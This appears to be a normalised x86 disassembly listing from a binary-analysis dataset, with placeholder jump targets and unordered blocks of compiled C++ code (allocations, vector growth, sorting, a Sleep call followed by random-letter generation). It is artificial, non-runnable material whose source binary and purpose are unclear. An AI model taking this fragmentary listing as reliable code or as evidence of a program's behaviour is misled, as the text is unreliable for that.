mov [ ebp - 0x4 ] 0xffffffff
sub esp 0x18
mov [ esi + 0x14 ] 0x1
mov eax esp
mov [ esi + 0x10 ] 0x0
mov ecx edi
mov [ esi + 0x18 ] 0x1
mov edx [ edi ]
mov [ ebp - 0x50 ] esp
push eax
call [ edx + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10034940
push 0x10
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
mov eax [ ebx + 0x10 ]
inc eax
mov [ ebx + 0x10 ] eax
mov ecx [ ecx + 0x34 ]
test ecx ecx
je r-xdata
xor edi edi
mov eax [ ebp - 0x4c ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x54 ]
mov [ edi ] r--data
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub esp 0x18
mov [ esi + 0x8 ] 0x1
mov eax esp
mov [ esi + 0x4 ] 0x1
mov ecx edi
mov edx [ edi ]
mov [ ebp - 0x50 ] esp
push eax
call [ edx + 0x8 ]
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call [ eax + 0x8 ]
push 0x10
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4 ] 0x5
test edi edi
je r-xdata
cmp eax ecx
jae r-xdata
xor esi esi
mov [ ebp - 0x4c ] esi
push ecx
mov ecx eax
call sub_10030220
mov esi eax
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x14
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push 0x1735
mov [ ebx + 0xc ] 0x0
call [ Sleep@IAT ]
imul eax [ ebx + 0x20 ] 0x343fd
xor edx edx
mov ecx 0x1a
mov [ ebp - 0x60 ] 0x0
push 0x84
add eax 0x269ec3
mov [ ebx + 0x20 ] eax
shr eax 0x10
div ecx
imul eax [ ebx + 0x20 ] 0x343fd
add dl 0x61
mov [ ebp - 0x60 ] dl
xor edx edx
add eax 0x269ec3
mov [ ebx + 0x20 ] eax
shr eax 0x10
div ecx
imul eax [ ebx + 0x20 ] 0x343fd
add dl 0x61
mov [ ebp - 0x5f ] dl
xor edx edx
add eax 0x269ec3
mov [ ebx + 0x20 ] eax
shr eax 0x10
div ecx
add dl 0x61
mov [ ebp - 0x5e ] dl
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4 ] 0x7
test esi esi
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
add ecx 0x4
add ecx esi
mov eax [ ecx ]
call [ eax + 0x24 ]
inc [ ebx + 0xc ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
push edi
call [ eax ]
test eax eax
jne r-xdata
xor esi esi
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + 0x4 ]
lea edx [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
add edx eax
mov eax [ ebx + 0x8 ]
movzx ecx [ eax + 0x50 ]
test cx cx
je r-xdata
xor esi esi
mov [ ebp - 0x54 ] esi
mov ecx [ ebx + 0x8 ]
mov edx [ ecx + 0x48 ]
mov ecx [ ecx + 0x44 ]
imul eax edx 0x3e8
push eax
imul eax ecx 0x3e8
mov ecx esi
push eax
call sub_1002bb80
mov esi eax
mov [ ebp - 0x54 ] eax
jmp r-xdata
imul edi [ ebx + 0x20 ] 0x343fd
add edi 0x269ec3
mov [ ebx + 0x20 ] edi
shr edi 0x10
mov edi ecx
jmp r-xdata
mov ecx [ ebx + 0x18 ]
push [ ebp - 0x54 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
push 0x78
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x4 ] 0xe
test edi edi
je r-xdata
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov edi edi
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x70 ]
mov ecx [ ebx + 0x8 ]
push eax
call sub_10038590
mov [ ebp - 0x4 ] 0xa
xor edi edi
mov eax [ ebp - 0x6c ]
sub eax [ ebp - 0x70 ]
sar eax 0x4
mov [ ebp - 0x50 ] edi
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x18 ] esi
mov edx [ esi ]
push [ eax + 0x2c ]
call [ edx + 0x20 ]
push 0x40
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x4 ] 0x9
test esi esi
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
push edx
push ecx
mov ecx esi
call sub_10001f70
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x80 ] di
mov [ ebp - 0x4 ] 0x7
jmp r-xdata
xor eax eax
mov ecx [ ebx + 0x8 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10038510
mov [ ebp - 0x4 ] 0xf
sub esp 0x18
mov ecx esp
mov [ ebp - 0x74 ] esp
mov [ ebp - 0x58 ] 0x1
push eax
call sub_10004f60
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x48 ]
mov ecx [ ebx + 0x8 ]
push eax
call sub_10038510
mov esi eax
mov [ ebp - 0x4 ] 0x11
mov eax 0x3
mov [ ebp - 0x58 ] eax
push ebx
push ecx
mov ecx ebx
call sub_10038830
add esp 0x4
push eax
push [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x12
mov ecx edi
call sub_1001ae10
jmp r-xdata
xor eax eax
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x70 ]
imul edi [ ebx + ecx + 0xc ] 0x3e8
imul eax [ ebx + ecx ] 0x3e8
imul edx [ ebx + ecx + 0x8 ] 0x3e8
imul ecx [ ebx + ecx + 0x4 ] 0x3e8
mov ebx [ ebp - 0x5c ]
mov [ ebx ] r--data
mov [ ebx + 0x4 ] eax
mov [ ebp - 0x4 ] 0xc
mov eax ebx
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edi
mov [ ebp - 0x4 ] 0xb
mov edi [ ebp - 0x50 ]
mov ebx [ ebp - 0x4c ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xa
test al 0x1
je r-xdata
and eax 0xfffffffd
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0x13
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x14
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x4 ] 0x13
mov eax [ ebp - 0x58 ]
test al 0x2
je r-xdata
cmp ecx [ esi + 0x38 ]
jne r-xdata
mov edx [ esi + 0x30 ]
lea ebx [ ebp - 0x64 ]
cmp edx ebx
mov ebx [ ebp - 0x4c ]
ja r-xdata
mov [ ebp - 0x4 ] 0xa
lea edx [ ebp - 0x64 ]
mov ecx [ esi + 0x34 ]
mov [ ebp - 0x64 ] eax
cmp edx ecx
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x70 ]
test eax eax
je r-xdata
and eax 0xfffffffe
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x48 ]
call j_sub_1003f3e3#2
mov eax [ ebp - 0x58 ]
add esp 0x4
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
push ecx
lea ecx [ esi + 0x30 ]
call sub_10003c10
mov eax [ ebp - 0x5c ]
lea edi [ ebp - 0x64 ]
sub edi edx
sar edi 0x2
cmp ecx [ esi + 0x38 ]
jne r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
add [ esi + 0x34 ] 0x4
inc edi
mov eax [ ebp - 0x6c ]
add ebx 0x10
sub eax [ ebp - 0x70 ]
sar eax 0x4
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] ebx
cmp edi eax
jb r-xdata
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x30 ]
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x4 ] 0xd
test ecx ecx
je r-xdata
push ecx
lea ecx [ esi + 0x30 ]
call sub_10003c10
push 0x14
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x4 ] 0xb
test eax eax
je r-xdata
mov ebx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xa
mov edi [ ebp - 0x50 ]
jmp r-xdata
mov eax [ eax + edi * 4 ]
mov [ ecx ] eax
sub_10039120
push ebp
mov ebp esp
mov eax 0x400c
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
inc [ ebx + 0x24 ]
mov [ ebp - 0x400c ] ebx
jne r-xdata
mov eax [ ebx + 0x18 ]
mov ecx esi
mov [ ebp - 0x4008 ] 0x0
mov edi [ eax ]
lea eax [ ebp - 0x4008 ]
push eax
mov eax [ esi ]
call [ eax + 0xc ]
mov ecx [ ebx + 0x18 ]
push eax
movzx eax [ ebx + 0x24 ]
push eax
call [ edi + 0x40 ]
test eax eax
je r-xdata
mov eax 0x1
mov [ ebx + 0x24 ] ax
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx esi
xor edi edi
call [ eax + 0xc ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc ]
mov ecx [ ebx + 0x18 ]
cmp edi eax
push [ ebp - 0x4008 ]
mov eax [ ecx ]
jne r-xdata
mov edi edi
call [ eax + 0x4c ]
call [ eax + 0x48 ]
jmp r-xdata
mov ebx [ ebp - 0x400c ]
mov eax [ ebp - 0x400c ]
push ebx
mov ecx [ eax + 0x18 ]
lea eax [ ebp - 0x4004 ]
push eax
push edi
push [ ebp - 0x4008 ]
mov edx [ ecx ]
call [ edx + 0x44 ]
cmp eax ebx
jne r-xdata
add edi eax
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
cmp edi eax
jb r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x4004 ]
push 0x4000
push ecx
push edi
mov ecx esi
call [ eax + 0x14 ]
mov ebx eax
test ebx ebx
je r-xdata
sub_10039220
push ebp
mov ebp esp
mov eax 0x4010
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4008 ] edi
mov ecx [ edi + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x4 ]
mov esi [ ecx + 0x4 ]
mov ecx [ edi + 0x14 ]
add esi 0x4
add esi ebx
mov eax [ ecx ]
call [ eax + 0x10 ]
push esi
mov ecx eax
mov edx [ eax ]
call [ edx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x14 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ edi + 0x18 ]
mov ebx eax
push 0x0
mov edx [ ecx ]
call [ edx + 0x30 ]
mov edi eax
mov [ ebp - 0x400c ] 0x0
mov edx [ ebx ]
lea eax [ ebp - 0x400c ]
push eax
push edi
mov ecx ebx
mov [ ebp - 0x4010 ] edi
call [ edx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
push 0x1
mov ecx [ eax + 0x4 ]
add ecx 0x4
add ecx ebx
mov eax [ ecx ]
call [ eax ]
push eax
mov ecx edi
call sub_10039120
mov edi [ ebp - 0x4008 ]
xor esi esi
test edi edi
je r-xdata
mov eax [ ebx ]
mov ecx ebx
push [ ebp - 0x400c ]
cmp esi edi
jne r-xdata
jmp r-xdata
call [ eax + 0x14 ]
call [ eax + 0x10 ]
mov edi [ ebp - 0x4008 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4008 ]
lea edx [ ebp - 0x4004 ]
push 0x4000
push edx
push esi
mov ecx [ eax + 0x18 ]
push 0x0
mov eax [ ecx ]
call [ eax + 0x34 ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ edi + 0x18 ]
push 0x0
mov eax [ ecx ]
call [ eax + 0x38 ]
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
test eax eax
jne r-xdata
push eax
mov ecx edi
call sub_10039390
jmp r-xdata
mov edi [ ebp - 0x4010 ]
mov edx [ ebx ]
lea eax [ ebp - 0x4004 ]
push edi
push eax
push esi
push [ ebp - 0x400c ]
mov ecx ebx
call [ edx + 0xc ]
cmp eax edi
mov edi [ ebp - 0x4010 ]
jne r-xdata
add esi eax
cmp esi edi
jb r-xdata
jmp r-xdata
sub_10039390
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov ecx edi
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
call eax
cmp al 0xb
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov ecx edi
mov eax [ eax + 0x4 ]
call eax
cmp al 0xc
jne r-xdata
mov eax [ edi ]
mov ecx edi
push 0x8000000c
call [ eax + 0x8 ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x4 ]
push esi
mov esi [ ecx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add esi 0x4
add esi ebx
mov ecx [ ecx + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
push esi
mov ecx eax
mov edx [ eax ]
call [ edx + 0x4 ]
pop esi
test eax eax
je r-xdata
mov ecx [ ebx + 0x14 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebx + 0x4 ]
push 0x1
mov ecx [ eax + 0x4 ]
add ecx 0x4
add ecx ebx
mov eax [ ecx ]
call [ eax ]
mov ecx [ ebp - 0x4 ]
push eax
call sub_10039120
sub_10039440
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e042
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10039500
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov [ ecx ] eax
mov eax [ edi + 0x4 ]
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
lea edx [ eax + edi * 8 ]
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10039500
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x4 ] eax
sub_10039500
mov edx [ ecx + 0x8 ]
mov eax edx
push esi
mov esi [ ecx + 0x4 ]
sub eax esi
sar eax 0x3
cmp eax 0x1
jae r-xdata
pop esi
retn 0x4
sub esi [ ecx ]
push edi
mov edi 0x1fffffff
sar esi 0x3
mov eax edi
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edx [ ecx ]
inc esi
sar edx 0x3
mov eax edx
shr eax 0x1
sub edi eax
cmp edi edx
pop edi
jae r-xdata
add edx eax
cmp edx esi
cmovb edx esi
push edx
call sub_10039570
xor edx edx
cmp edx esi
cmovb edx esi
push edx
call sub_10039570
pop esi
retn 0x4
sub_10039570
push ebp
mov ebp esp
push 0xffffffff
push sub_10053300
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_1003a320
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov eax [ edi + 0x4 ]
sub eax ecx
sar eax 0x3
mov [ ebp + 0x8 ] eax
test ecx ecx
je r-xdata
cmp ebx 0x1fffffff
ja r-xdata
lea eax [ esi + ebx * 8 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
lea eax [ esi + eax * 8 ]
mov [ edi + 0x4 ] eax
mov [ edi ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ecx
call j_sub_1003f3e3#2
add esp 0x4
call sub_1003c58d
lea eax [ ebx * 8 ]
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10039650
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] 0x0
test edx edx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
sub_100396b0
push ebp
mov ebp esp
sub esp 0xc
mov eax 0x4ec4ec4f
push ebx
push esi
push edi
mov edi edx
mov ebx ecx
mov esi edi
sub esi ebx
imul esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
push [ ebp + 0xc ]
mov edx edi
mov ecx ebx
call sub_1003a660
add esp 0x8
cmp eax 0x20
jle r-xdata
push [ ebp + 0xc ]
mov edx ebx
lea ecx [ ebp - 0x8 ]
push edi
call sub_100397f0
mov eax esi
add esp 0x8
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
mov eax ecx
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax 0x4ec4ec4f
mov [ ebp + 0x8 ] ecx
mov ecx edi
sub ecx [ ebp - 0x4 ]
imul ecx
mov ecx [ ebp - 0x8 ]
mov eax 0x4ec4ec4f
push [ ebp + 0xc ]
sar edx 0x5
sub ecx ebx
mov esi edx
shr esi 0x1f
add esi edx
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
mov esi [ ebp + 0x8 ]
push esi
jge r-xdata
mov ecx edi
mov eax 0x4ec4ec4f
sub ecx ebx
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
call sub_100396b0
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx ebx
call sub_100396b0
mov ebx [ ebp - 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov edx edi
mov ecx ebx
call sub_1003a500
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub esp 0x8
mov edx edi
mov ecx ebx
push [ ebp + 0xc ]
call sub_1003a450
add esp 0xc
test esi esi
jle r-xdata
mov ecx edi
mov eax 0x4ec4ec4f
sub ecx ebx
add esp 0x8
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x20
jg r-xdata
sub_100397f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053333
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov [ ebp - 0x108 ] edi
mov [ ebp - 0x118 ] ecx
mov esi [ ebp + 0x8 ]
mov eax 0x4ec4ec4f
push [ ebp + 0xc ]
mov ecx esi
mov [ ebp - 0xfc ] esi
sub ecx edi
imul ecx
mov ecx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cdq
sub eax edx
sar eax 0x1
imul ebx eax 0x68
lea eax [ esi - 0x68 ]
push eax
add ebx edi
mov edx ebx
mov [ ebp - 0xe4 ] ebx
call sub_1003a3a0
add esp 0x8
lea edi [ ebx + 0x68 ]
mov [ ebp - 0xec ] edi
cmp [ ebp - 0x108 ] ebx
jae r-xdata
mov ecx [ ebp - 0xfc ]
cmp edi ecx
jae r-xdata
lea eax [ ebx - 0x20 ]
mov [ ebp - 0xf0 ] eax
jmp r-xdata
mov esi [ ebp - 0xe4 ]
mov ebx edi
mov eax esi
mov [ ebp - 0xf4 ] eax
mov ecx [ ebp - 0xec ]
lea edi [ ebx + 0x38 ]
add ecx 0x48
mov [ ebp - 0xe8 ] ecx
jmp r-xdata
mov ecx [ eax + 0x6c ]
cmp ecx 0x10
mov edx [ eax + 0x68 ]
mov [ ebp - 0x104 ] ecx
lea ecx [ eax + 0x58 ]
mov [ ebp - 0xe8 ] edx
jb r-xdata
mov ecx [ ebp - 0x108 ]
cmp eax ecx
jbe r-xdata
lea ecx [ esi + 0x38 ]
lea eax [ ebx + 0x48 ]
mov [ ebp - 0xe8 ] ecx
mov [ ebp - 0xf0 ] eax
lea ebx [ ebx ]
cmp [ edi + 0x14 ] 0x10
mov eax [ edi + 0x10 ]
mov [ ebp - 0xf0 ] eax
jb r-xdata
mov edi ecx
mov edi [ ecx ]
jmp r-xdata
jne r-xdata
lea ecx [ esi + 0x48 ]
lea ebx [ eax - 0x20 ]
mov [ ebp - 0xe8 ] ecx
mov [ ebp - 0xf0 ] ebx
mov edi edx
mov edi [ edx ]
jmp r-xdata
mov esi edi
mov esi [ edi ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ebp - 0xf4 ] esi
lea esi [ eax - 0x10 ]
mov [ ebp - 0x100 ] ebx
cmp ebx 0x10
jb r-xdata
mov ebx [ ebp - 0xf8 ]
sub eax 0x68
mov [ ebp - 0xf4 ] eax
cmp ebx [ ebp - 0xfc ]
jne r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax [ ebp - 0xfc ]
je r-xdata
mov [ ebp - 0x10c ] edx
mov edi [ edx ]
mov [ ebp - 0x10c ] edi
jmp r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x10
mov eax [ ecx + 0x10 ]
mov [ ebp - 0x100 ] eax
jb r-xdata
mov edi ecx
mov edi [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov ebx [ ecx ]
add ecx 0xfffffff0
mov [ ebp - 0x100 ] edx
cmp edx 0x10
jb r-xdata
mov ebx [ ebp - 0xe8 ]
mov edi [ ebp - 0xf4 ]
cmp edi ebx
jae r-xdata
sub edx 0x4
jb r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax [ ebp - 0xe8 ]
cmovb edx eax
test edx edx
je r-xdata
mov edx eax
mov ecx ebx
call sub_1003ab20
mov esi [ ebp - 0xe4 ]
add ebx 0x68
mov eax [ ebp - 0xf4 ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
mov esi [ ebp - 0xe4 ]
sub esi 0x68
mov [ ebp - 0xe4 ] esi
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x118 ]
mov eax [ ebp - 0xe4 ]
mov [ ecx ] eax
mov eax [ ebp - 0xec ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0xec ]
cmp edi eax
je r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0x10
mov eax [ ebx ]
mov [ ebp - 0x114 ] esi
lea esi [ ebx - 0x10 ]
mov [ ebp - 0x104 ] eax
jb r-xdata
mov esi [ ebp - 0xe8 ]
cmp eax ebx
jae r-xdata
sub ecx 0x4
jb r-xdata
cmp eax ebx
mov ecx ebx
cmovb ecx eax
test ecx ecx
je r-xdata
cmp ebx eax
jae r-xdata
sub edx 0x4
jb r-xdata
cmp ebx eax
mov edx eax
cmovb edx ebx
test edx edx
je r-xdata
xor eax eax
cmp edi ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp edx 0xfffffffc
je r-xdata
mov eax [ ebx ]
cmp eax [ edi ]
jne r-xdata
mov [ ebp - 0xf8 ] ebx
nop
mov eax [ ebp - 0xec ]
mov ecx esi
sub eax 0x68
mov edx eax
mov [ ebp - 0xec ] eax
call sub_1003ab20
mov eax [ ebp - 0xf4 ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
mov edx esi
mov ecx eax
call sub_1003ab20
mov ecx [ ebp - 0xe4 ]
add edi 0x68
mov [ ebp - 0xec ] edi
mov esi eax
mov edi ecx
add eax 0x68
add ecx 0x68
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0xe4 ] ecx
lea ecx [ ebp - 0x78 ]
push edi
call sub_1002d810
mov [ ebp - 0x4 ] 0x1
cmp edi esi
je r-xdata
mov ebx [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe0 ]
push ebx
call sub_1002d810
mov [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
mov ebx [ ebp - 0x104 ]
mov edi [ ebp - 0x100 ]
cmp ebx edi
jae r-xdata
sub ecx 0x4
jb r-xdata
mov edi [ ebp - 0xe8 ]
mov ecx [ ecx ]
cmp eax [ edi ]
mov edi [ ebp - 0x10c ]
cmovb ecx eax
test ecx ecx
je r-xdata
xor eax eax
cmp [ esi + 0x10 ] ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp ecx 0xfffffffc
je r-xdata
mov edi edi
xor eax eax
cmp ebx [ ebp - 0xf0 ]
setne al
or eax 0xffffffff
jmp r-xdata
cmp edx 0xfffffffc
je r-xdata
mov edi edi
mov ebx [ ebp - 0xe4 ]
cmp [ ebp - 0x100 ] 0x10
jb r-xdata
test eax eax
sets al
test al al
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ edi ]
jne r-xdata
add ebx 0x4
add edi 0x4
sub edx 0x4
jae r-xdata
cmp ebx ecx
jae r-xdata
lea ebx [ esi + 0x18 ]
lea ecx [ edi + 0x18 ]
cmp ecx ebx
je r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_100018b0
lea esi [ edi + 0x18 ]
lea ecx [ ebx + 0x18 ]
cmp ecx esi
je r-xdata
push 0xffffffff
push 0x0
push edi
mov ecx ebx
call sub_100018b0
xor eax eax
cmp ebx edi
setne al
or eax 0xffffffff
jmp r-xdata
cmp ecx 0xfffffffc
je r-xdata
mov eax [ ebx ]
cmp eax [ edi ]
jne r-xdata
